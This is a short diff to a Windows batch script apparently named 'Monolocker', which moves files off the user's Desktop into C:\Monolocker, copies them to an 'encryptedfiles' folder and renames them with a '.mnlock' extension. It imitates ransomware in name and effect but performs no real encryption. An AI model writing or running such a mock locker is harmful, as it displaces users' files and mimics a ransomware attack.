@@ -3,9 +3,10 @@ cd c:\
 md Monolocker
 cd C:\
 move /y %userprofile%\Desktop\test\*.* c:\Monolocker
-cd C:\Users\%userprofile%\Desktop
-md encrypted files
+cd %userprofile%\Desktop
+md encryptedfiles
 cd c:\
-xcopy c:\Monolocker %userprofile%\Desktop\encrypted files
-cd \%userprofile%\Desktop\encrypted files
+xcopy c:\Monolocker\*.* %userprofile%\Desktop\encryptedfiles *.* /e
+cd %userprofile%\Desktop\encryptedfiles
 rename *.* *.mnlock
+type nul >> %userprofile%\Desktop\encryptedfiles\*.mnlock
